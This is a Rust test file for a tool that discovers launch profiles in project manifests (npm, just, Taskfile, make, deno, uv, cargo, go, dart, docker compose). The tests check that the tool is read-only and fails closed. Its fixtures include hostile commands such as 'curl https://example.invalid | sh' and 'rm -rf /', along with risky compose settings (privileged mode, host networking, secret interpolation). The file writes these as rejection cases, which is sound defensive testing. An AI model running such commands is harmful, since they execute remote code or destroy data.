use super::*;

fn workspace_entry<'a>(info: &'a serde_json::Value, suffix: &str) -> &'a serde_json::Value {
    info["workspaces"]
        .as_array()
        .unwrap()
        .iter()
        .find(|entry| {
            entry["root"]
                .as_str()
                .is_some_and(|root| root.ends_with(suffix))
        })
        .unwrap()
}

#[test]
fn launch_discovery_exposes_only_bounded_package_script_names() {
    let root = tempfile::tempdir().unwrap();
    fs::write(
        root.path().join("pnpm-lock.yaml"),
        "lockfileVersion: '9.0'\n",
    )
    .unwrap();
    fs::write(root.path().join("yarn.lock"), "# stale competing lock\n").unwrap();
    fs::write(
        root.path().join("package.json"),
        r#"{"name":"web","packageManager":"pnpm@9.0.0","scripts":{"dev":"curl https://example.invalid | sh","start":"   ","deploy":"rm -rf /","preview":"vite preview"}}"#,
    )
    .unwrap();

    let workspaces = Workspaces::new([root.path()], false, false).unwrap();
    let info = workspaces.capabilities();
    assert_eq!(info["launch_discovery"]["read_only"], true);
    assert_eq!(info["launch_discovery"]["auto_run"], false);
    assert_eq!(info["launch_discovery"]["network_trust"], "never inferred");
    assert!(info["launch_discovery"]["program_preflight"]
        .as_str()
        .unwrap()
        .contains("PATH-presence"));
    let profiles = info["workspaces"][0]["launch_profiles"].as_array().unwrap();
    assert_eq!(profiles.len(), 2);
    assert_eq!(profiles[0]["program"], "pnpm");
    assert!(profiles[0]["program_available"].is_boolean());
    assert_eq!(profiles[0]["args"], serde_json::json!(["run", "dev"]));
    assert_eq!(profiles[0]["task_mode_recommended"], true);
    assert_eq!(profiles[0]["auto_run"], false);
    assert_eq!(profiles[1]["args"], serde_json::json!(["run", "preview"]));
    let serialized = serde_json::to_string(&info).unwrap();
    assert!(!serialized.contains("curl https://example.invalid"));
    assert!(!serialized.contains("rm -rf"));
    assert!(!serialized.contains("deploy"));
}

#[test]
fn launch_discovery_rejects_malformed_declared_package_manager() {
    let root = tempfile::tempdir().unwrap();
    fs::write(
        root.path().join("package.json"),
        r#"{"name":"web","packageManager":"pnpm@","scripts":{"dev":"vite"}}"#,
    )
    .unwrap();
    fs::write(
        root.path().join("package-lock.json"),
        r#"{"lockfileVersion":3}"#,
    )
    .unwrap();

    let workspaces = Workspaces::new([root.path()], false, false).unwrap();
    let info = workspaces.capabilities();
    assert!(info["workspaces"][0]["launch_profiles"]
        .as_array()
        .unwrap()
        .is_empty());
}

#[test]
fn launch_discovery_finds_unambiguous_rust_go_and_uv_entrypoints() {
    let root = tempfile::tempdir().unwrap();
    let rust = root.path().join("rust-app");
    let go = root.path().join("go-app");
    let deno = root.path().join("deno-app");
    let python = root.path().join("py-app");
    fs::create_dir_all(rust.join("src")).unwrap();
    fs::create_dir_all(&go).unwrap();
    fs::create_dir_all(&deno).unwrap();
    fs::create_dir_all(&python).unwrap();
    fs::write(
        rust.join("Cargo.toml"),
        "[package]\nname='rust-app'\nversion='0.1.0'\n",
    )
    .unwrap();
    fs::write(rust.join("src/main.rs"), "fn main() {}\n").unwrap();
    fs::write(
        go.join("go.mod"),
        "module example.invalid/go-app\n\ngo 1.22\n",
    )
    .unwrap();
    fs::write(go.join("server.go"), "package main\nfunc main() {}\n").unwrap();
    fs::write(
        deno.join("deno.json"),
        r#"{"tasks":{"dev":"deno run -A main.ts","preview":"   ","deploy":"deno run -A deploy.ts"}}"#,
    )
    .unwrap();
    fs::write(python.join("uv.lock"), "version = 1\n").unwrap();
    fs::write(
        python.join("pyproject.toml"),
        "[project]\nname='py-app'\nversion='0.1.0'\n[project.scripts]\ndev='pkg.cli:main'\npreview={call='pkg.bad:main'}\nunsafe='pkg.bad:main'\n",
    )
    .unwrap();

    let workspaces = Workspaces::new(
        [
            rust.as_path(),
            go.as_path(),
            deno.as_path(),
            python.as_path(),
        ],
        false,
        false,
    )
    .unwrap();
    let info = workspaces.capabilities();
    let rust_profiles = workspace_entry(&info, "rust-app")["launch_profiles"]
        .as_array()
        .unwrap();
    assert_eq!(rust_profiles.len(), 1);
    assert_eq!(rust_profiles[0]["program"], "cargo");
    assert_eq!(rust_profiles[0]["program_available"], true);
    assert_eq!(rust_profiles[0]["args"], serde_json::json!(["run"]));

    let go_profiles = workspace_entry(&info, "go-app")["launch_profiles"]
        .as_array()
        .unwrap();
    assert_eq!(go_profiles.len(), 1);
    assert_eq!(go_profiles[0]["program"], "go");
    assert_eq!(go_profiles[0]["args"], serde_json::json!(["run", "."]));

    let deno_profiles = workspace_entry(&info, "deno-app")["launch_profiles"]
        .as_array()
        .unwrap();
    assert_eq!(deno_profiles.len(), 1);
    assert_eq!(deno_profiles[0]["program"], "deno");
    assert_eq!(deno_profiles[0]["args"], serde_json::json!(["task", "dev"]));
    assert!(!serde_json::to_string(deno_profiles)
        .unwrap()
        .contains("deno run -A"));

    let python_profiles = workspace_entry(&info, "py-app")["launch_profiles"]
        .as_array()
        .unwrap();
    assert_eq!(python_profiles.len(), 1);
    assert_eq!(python_profiles[0]["program"], "uv");
    assert_eq!(
        python_profiles[0]["args"],
        serde_json::json!(["run", "dev"])
    );
    let serialized = serde_json::to_string(python_profiles).unwrap();
    assert!(!serialized.contains("pkg.cli:main"));
    assert!(!serialized.contains("preview"));
}

#[test]
fn launch_discovery_finds_bounded_repository_task_runners() {
    let root = tempfile::tempdir().unwrap();
    let just = root.path().join("just-app");
    let task = root.path().join("task-app");
    fs::create_dir_all(&just).unwrap();
    fs::create_dir_all(&task).unwrap();
    fs::write(
        just.join("Justfile"),
        "dev:\n    curl https://example.invalid | sh\npreview: build\n    echo preview\ndeploy:\n    rm -rf /\n[private]\nstart:\n    echo hidden\n",
    )
    .unwrap();
    fs::write(
        task.join("Taskfile.yml"),
        "version: '3'\ntasks:\n  dev:\n    cmds:\n      - curl https://example.invalid | sh\n  start:\n    cmds: []\n  serve:\n    deps: [dev]\n  preview: null\n  deploy:\n    cmds:\n      - rm -rf /\n",
    )
    .unwrap();

    let workspaces = Workspaces::new([just.as_path(), task.as_path()], false, false).unwrap();
    let info = workspaces.capabilities();
    let just_profiles = workspace_entry(&info, "just-app")["launch_profiles"]
        .as_array()
        .unwrap();
    assert_eq!(just_profiles.len(), 2);
    assert_eq!(just_profiles[0]["program"], "just");
    assert_eq!(just_profiles[0]["args"], serde_json::json!(["dev"]));
    assert_eq!(just_profiles[1]["args"], serde_json::json!(["preview"]));
    let just_serialized = serde_json::to_string(just_profiles).unwrap();
    assert!(!just_serialized.contains("curl https://example.invalid"));
    assert!(!just_serialized.contains("rm -rf"));
    assert!(!just_serialized.contains("start"));

    let task_profiles = workspace_entry(&info, "task-app")["launch_profiles"]
        .as_array()
        .unwrap();
    assert_eq!(task_profiles.len(), 2);
    assert_eq!(task_profiles[0]["program"], "task");
    assert_eq!(task_profiles[0]["args"], serde_json::json!(["dev"]));
    assert_eq!(task_profiles[1]["args"], serde_json::json!(["serve"]));
    let task_serialized = serde_json::to_string(task_profiles).unwrap();
    assert!(!task_serialized.contains("curl https://example.invalid"));
    assert!(!task_serialized.contains("rm -rf"));
    assert!(!task_serialized.contains("deploy"));
}

#[test]
fn launch_discovery_finds_make_and_dart_entrypoints() {
    let root = tempfile::tempdir().unwrap();
    let make = root.path().join("make-app");
    let dart = root.path().join("dart-app");
    let ambiguous_dart = root.path().join("ambiguous-dart-app");
    fs::create_dir_all(&make).unwrap();
    fs::create_dir_all(dart.join("bin")).unwrap();
    fs::create_dir_all(ambiguous_dart.join("bin")).unwrap();
    fs::write(
        make.join("Makefile"),
        "dev: deps\n\tcurl https://example.invalid | sh\ndev: extra\ndeps:\n\t@true\nextra:\n\t@true\nstart:=not-a-target\ndeploy:\n\trm -rf /\ndefine dev\nignored\nendef\n",
    )
    .unwrap();
    fs::write(
        dart.join("pubspec.yaml"),
        "name: dart_app\nversion: 1.0.0\n",
    )
    .unwrap();
    fs::write(dart.join("bin/server.dart"), "void main() {}\n").unwrap();
    fs::write(
        ambiguous_dart.join("pubspec.yaml"),
        "name: ambiguous_dart_app\nversion: 1.0.0\n",
    )
    .unwrap();
    fs::write(ambiguous_dart.join("bin/a.dart"), "void main() {}\n").unwrap();
    fs::write(ambiguous_dart.join("bin/b.dart"), "void main() {}\n").unwrap();

    let workspaces = Workspaces::new(
        [make.as_path(), dart.as_path(), ambiguous_dart.as_path()],
        false,
        false,
    )
    .unwrap();
    let info = workspaces.capabilities();
    let make_profiles = workspace_entry(&info, "make-app")["launch_profiles"]
        .as_array()
        .unwrap();
    assert_eq!(make_profiles.len(), 1);
    assert_eq!(make_profiles[0]["program"], "make");
    assert_eq!(make_profiles[0]["args"], serde_json::json!(["dev"]));
    let make_serialized = serde_json::to_string(make_profiles).unwrap();
    assert!(!make_serialized.contains("curl https://example.invalid"));
    assert!(!make_serialized.contains("rm -rf"));
    assert!(!make_serialized.contains("start"));

    let dart_profiles = workspace_entry(&info, "dart-app")["launch_profiles"]
        .as_array()
        .unwrap();
    assert_eq!(dart_profiles.len(), 1);
    assert_eq!(dart_profiles[0]["program"], "dart");
    assert_eq!(
        dart_profiles[0]["args"],
        serde_json::json!(["run", "bin/server.dart"])
    );
    assert!(
        workspace_entry(&info, "ambiguous-dart-app")["launch_profiles"]
            .as_array()
            .unwrap()
            .is_empty()
    );
}

#[test]
fn launch_discovery_fails_closed_on_ambiguous_task_runner_manifests() {
    let root = tempfile::tempdir().unwrap();
    let just = root.path().join("just-app");
    let make = root.path().join("make-app");
    let task = root.path().join("task-app");
    let compose = root.path().join("compose-app");
    fs::create_dir_all(&just).unwrap();
    fs::create_dir_all(&make).unwrap();
    fs::create_dir_all(&task).unwrap();
    fs::create_dir_all(&compose).unwrap();
    fs::write(just.join("Justfile"), "dev:\n    echo one\n").unwrap();
    fs::write(just.join(".justfile"), "dev:\n    echo two\n").unwrap();
    fs::write(make.join("Makefile"), "dev:\n\techo one\n").unwrap();
    fs::write(make.join("GNUmakefile"), "dev:\n\techo two\n").unwrap();
    fs::write(
        task.join("Taskfile.yml"),
        "version: '3'\ntasks:\n  dev:\n    cmds: [echo one]\n",
    )
    .unwrap();
    fs::write(
        task.join("Taskfile.yaml"),
        "version: '3'\ntasks:\n  dev:\n    cmds: [echo two]\n",
    )
    .unwrap();
    fs::write(
        compose.join("compose.yaml"),
        "services:\n  api:\n    image: example/api:1\n",
    )
    .unwrap();
    fs::write(
        compose.join("docker-compose.yml"),
        "services:\n  api:\n    image: example/api:2\n",
    )
    .unwrap();

    let workspaces = Workspaces::new(
        [
            just.as_path(),
            make.as_path(),
            task.as_path(),
            compose.as_path(),
        ],
        false,
        false,
    )
    .unwrap();
    let info = workspaces.capabilities();
    assert!(workspace_entry(&info, "just-app")["launch_profiles"]
        .as_array()
        .unwrap()
        .is_empty());
    assert!(workspace_entry(&info, "make-app")["launch_profiles"]
        .as_array()
        .unwrap()
        .is_empty());
    assert!(workspace_entry(&info, "task-app")["launch_profiles"]
        .as_array()
        .unwrap()
        .is_empty());
    assert!(workspace_entry(&info, "compose-app")["launch_profiles"]
        .as_array()
        .unwrap()
        .is_empty());
}

#[test]
fn launch_discovery_exposes_only_bounded_attached_compose_stacks() {
    let root = tempfile::tempdir().unwrap();
    let safe = root.path().join("safe-compose");
    let privileged = root.path().join("privileged-compose");
    let broad_port = root.path().join("broad-port-compose");
    let bind_mount = root.path().join("bind-compose");
    let build = root.path().join("build-compose");
    let restart = root.path().join("restart-compose");
    let host_namespace = root.path().join("host-namespace-compose");
    let interpolated = root.path().join("interpolated-compose");
    let api_socket = root.path().join("api-socket-compose");
    let lifecycle_hook = root.path().join("lifecycle-hook-compose");
    let named_project = root.path().join("named-project-compose");
    for path in [
        &safe,
        &privileged,
        &broad_port,
        &bind_mount,
        &build,
        &restart,
        &host_namespace,
        &interpolated,
        &api_socket,
        &lifecycle_hook,
        &named_project,
    ] {
        fs::create_dir_all(path).unwrap();
    }
    fs::write(
        safe.join("compose.yaml"),
        "services:\n  api:\n    image: example/api:1\n    ports: ['127.0.0.1:8080:8080']\n  worker:\n    image: example/worker:1\nnetworks:\n  backend: {}\n",
    )
    .unwrap();
    fs::write(
        privileged.join("compose.yaml"),
        "services:\n  api:\n    image: example/api:1\n    privileged: true\n",
    )
    .unwrap();
    fs::write(
        broad_port.join("compose.yaml"),
        "services:\n  api:\n    image: example/api:1\n    ports: ['8080:8080']\n",
    )
    .unwrap();
    fs::write(
        bind_mount.join("compose.yaml"),
        "services:\n  api:\n    image: example/api:1\n    volumes: ['./:/app']\n",
    )
    .unwrap();
    fs::write(
        build.join("compose.yaml"),
        "services:\n  api:\n    build: .\n    image: example/api:1\n",
    )
    .unwrap();
    fs::write(
        restart.join("compose.yaml"),
        "services:\n  api:\n    image: example/api:1\n    restart: always\n",
    )
    .unwrap();
    fs::write(
        host_namespace.join("compose.yaml"),
        "services:\n  api:\n    image: example/api:1\n    network_mode: host\n",
    )
    .unwrap();
    fs::write(
        interpolated.join("compose.yaml"),
        "services:\n  api:\n    image: example/api:1\n    command: ['echo', '${HOST_SECRET}']\n",
    )
    .unwrap();
    fs::write(
        api_socket.join("compose.yaml"),
        "services:\n  api:\n    image: example/api:1\n    use_api_socket: true\n",
    )
    .unwrap();
    fs::write(
        lifecycle_hook.join("compose.yaml"),
        "services:\n  api:\n    image: example/api:1\n    post_start:\n      - command: id\n        privileged: true\n",
    )
    .unwrap();
    fs::write(
        named_project.join("compose.yaml"),
        "name: shared-project\nservices:\n  api:\n    image: example/api:1\n",
    )
    .unwrap();

    let workspaces = Workspaces::new(
        [
            safe.as_path(),
            privileged.as_path(),
            broad_port.as_path(),
            bind_mount.as_path(),
            build.as_path(),
            restart.as_path(),
            host_namespace.as_path(),
            interpolated.as_path(),
            api_socket.as_path(),
            lifecycle_hook.as_path(),
            named_project.as_path(),
        ],
        false,
        false,
    )
    .unwrap();
    let info = workspaces.capabilities();
    let profiles = workspace_entry(&info, "safe-compose")["launch_profiles"]
        .as_array()
        .unwrap();
    assert_eq!(profiles.len(), 1);
    assert_eq!(profiles[0]["program"], "docker");
    assert!(profiles[0]["program_available"].is_boolean());
    assert_eq!(
        profiles[0]["args"],
        serde_json::json!([
            "compose",
            "up",
            "--no-build",
            "--pull",
            "never",
            "--abort-on-container-exit"
        ])
    );
    assert_eq!(profiles[0]["authorization"], "exact_risky_execution");
    assert_eq!(
        profiles[0]["lifecycle"],
        "attached-supervised-process-group"
    );
    assert_eq!(profiles[0]["status_probe"]["program"], "docker");
    assert_eq!(
        profiles[0]["status_probe"]["args"],
        serde_json::json!([
            "compose",
            "ps",
            "--all",
            "--orphans=false",
            "--format",
            "{{.Service}}\t{{.State}}\t{{.Health}}\t{{.ExitCode}}"
        ])
    );
    assert_eq!(
        profiles[0]["status_probe"]["precision"],
        "runtime_container_state_reported_health"
    );
    assert_eq!(profiles[0]["status_probe"]["auto_run"], false);
    for suffix in [
        "privileged-compose",
        "broad-port-compose",
        "bind-compose",
        "build-compose",
        "restart-compose",
        "host-namespace-compose",
        "interpolated-compose",
        "api-socket-compose",
        "lifecycle-hook-compose",
        "named-project-compose",
    ] {
        assert!(workspace_entry(&info, suffix)["launch_profiles"]
            .as_array()
            .unwrap()
            .is_empty());
    }
}

#[test]
fn launch_discovery_targets_a_single_explicit_cargo_binary() {
    let root = tempfile::tempdir().unwrap();
    let rust = root.path().join("rust-app");
    fs::create_dir_all(&rust).unwrap();
    fs::write(
        rust.join("Cargo.toml"),
        "[package]\nname='rust-app'\nversion='0.1.0'\n[[bin]]\nname='worker'\npath='worker.rs'\n",
    )
    .unwrap();
    fs::write(rust.join("worker.rs"), "fn main() {}\n").unwrap();

    let workspaces = Workspaces::new([rust.as_path()], false, false).unwrap();
    let info = workspaces.capabilities();
    let profiles = workspace_entry(&info, "rust-app")["launch_profiles"]
        .as_array()
        .unwrap();
    assert_eq!(profiles.len(), 1);
    assert_eq!(profiles[0]["program"], "cargo");
    assert_eq!(
        profiles[0]["args"],
        serde_json::json!(["run", "--bin", "worker"])
    );
}

#[test]
fn launch_discovery_skips_feature_gated_explicit_cargo_binary() {
    let root = tempfile::tempdir().unwrap();
    let rust = root.path().join("rust-app");
    fs::create_dir_all(&rust).unwrap();
    fs::write(
        rust.join("Cargo.toml"),
        "[package]\nname='rust-app'\nversion='0.1.0'\n[[bin]]\nname='worker'\npath='worker.rs'\nrequired-features=['worker-cli']\n",
    )
    .unwrap();
    fs::write(rust.join("worker.rs"), "fn main() {}\n").unwrap();

    let workspaces = Workspaces::new([rust.as_path()], false, false).unwrap();
    let info = workspaces.capabilities();
    assert!(workspace_entry(&info, "rust-app")["launch_profiles"]
        .as_array()
        .unwrap()
        .is_empty());
}

#[test]
fn launch_discovery_respects_disabled_cargo_autobins() {
    let root = tempfile::tempdir().unwrap();
    let rust = root.path().join("rust-app");
    fs::create_dir_all(rust.join("src")).unwrap();
    fs::write(
        rust.join("Cargo.toml"),
        "[package]\nname='rust-app'\nversion='0.1.0'\nautobins=false\n",
    )
    .unwrap();
    fs::write(rust.join("src/main.rs"), "fn main() {}\n").unwrap();

    let workspaces = Workspaces::new([rust.as_path()], false, false).unwrap();
    let info = workspaces.capabilities();
    assert!(workspace_entry(&info, "rust-app")["launch_profiles"]
        .as_array()
        .unwrap()
        .is_empty());
}

#[test]
fn launch_discovery_finds_go_cmd_main_without_main_go_filename() {
    let root = tempfile::tempdir().unwrap();
    let go = root.path().join("go-app");
    let command = go.join("cmd/worker");
    fs::create_dir_all(&command).unwrap();
    fs::write(
        go.join("go.mod"),
        "module example.invalid/go-app\n\ngo 1.22\n",
    )
    .unwrap();
    fs::write(command.join("worker.go"), "package main\nfunc main() {}\n").unwrap();
    fs::write(command.join("worker_test.go"), "package worker_test\n").unwrap();

    let workspaces = Workspaces::new([go.as_path()], false, false).unwrap();
    let info = workspaces.capabilities();
    let profiles = workspace_entry(&info, "go-app")["launch_profiles"]
        .as_array()
        .unwrap();
    assert_eq!(profiles.len(), 1);
    assert_eq!(profiles[0]["program"], "go");
    assert_eq!(
        profiles[0]["args"],
        serde_json::json!(["run", "./cmd/worker"])
    );
}

#[test]
fn launch_discovery_fails_closed_when_bounded_binary_scan_is_incomplete() {
    let root = tempfile::tempdir().unwrap();
    let rust = root.path().join("rust-app");
    fs::create_dir_all(rust.join("src/bin")).unwrap();
    fs::write(
        rust.join("Cargo.toml"),
        "[package]\nname='rust-app'\nversion='0.1.0'\n",
    )
    .unwrap();
    fs::write(rust.join("src/main.rs"), "fn main() {}\n").unwrap();
    for index in 0..=128 {
        fs::write(
            rust.join("src/bin").join(format!("noise-{index}.txt")),
            "noise\n",
        )
        .unwrap();
    }

    let workspaces = Workspaces::new([rust.as_path()], false, false).unwrap();
    let info = workspaces.capabilities();
    assert!(workspace_entry(&info, "rust-app")["launch_profiles"]
        .as_array()
        .unwrap()
        .is_empty());
}

#[test]
fn launch_discovery_fails_closed_on_ambiguous_or_oversized_inputs() {
    let root = tempfile::tempdir().unwrap();
    let rust = root.path().join("rust-app");
    let web = root.path().join("web-app");
    let conflicting_web = root.path().join("conflicting-web-app");
    fs::create_dir_all(rust.join("src/bin")).unwrap();
    fs::create_dir_all(&web).unwrap();
    fs::create_dir_all(&conflicting_web).unwrap();
    fs::write(
        rust.join("Cargo.toml"),
        "[package]\nname='rust-app'\nversion='0.1.0'\n",
    )
    .unwrap();
    fs::write(rust.join("src/bin/a.rs"), "fn main() {}\n").unwrap();
    fs::write(rust.join("src/bin/b.rs"), "fn main() {}\n").unwrap();
    let mut oversized = String::from("{\"name\":\"web\",\"scripts\":{\"dev\":\"");
    oversized.push_str(&"x".repeat((256 * 1024) + 1));
    oversized.push_str("\"}}");
    fs::write(web.join("package.json"), oversized).unwrap();
    fs::write(
        conflicting_web.join("package.json"),
        r#"{"name":"conflict","scripts":{"dev":"vite"}}"#,
    )
    .unwrap();
    fs::write(
        conflicting_web.join("pnpm-lock.yaml"),
        "lockfileVersion: '9.0'\n",
    )
    .unwrap();
    fs::write(conflicting_web.join("yarn.lock"), "# competing lock\n").unwrap();

    let workspaces = Workspaces::new(
        [rust.as_path(), web.as_path(), conflicting_web.as_path()],
        false,
        false,
    )
    .unwrap();
    let info = workspaces.capabilities();
    assert!(workspace_entry(&info, "rust-app")["launch_profiles"]
        .as_array()
        .unwrap()
        .is_empty());
    assert!(workspace_entry(&info, "web-app")["launch_profiles"]
        .as_array()
        .unwrap()
        .is_empty());
    assert!(
        workspace_entry(&info, "conflicting-web-app")["launch_profiles"]
            .as_array()
            .unwrap()
            .is_empty()
    );
}
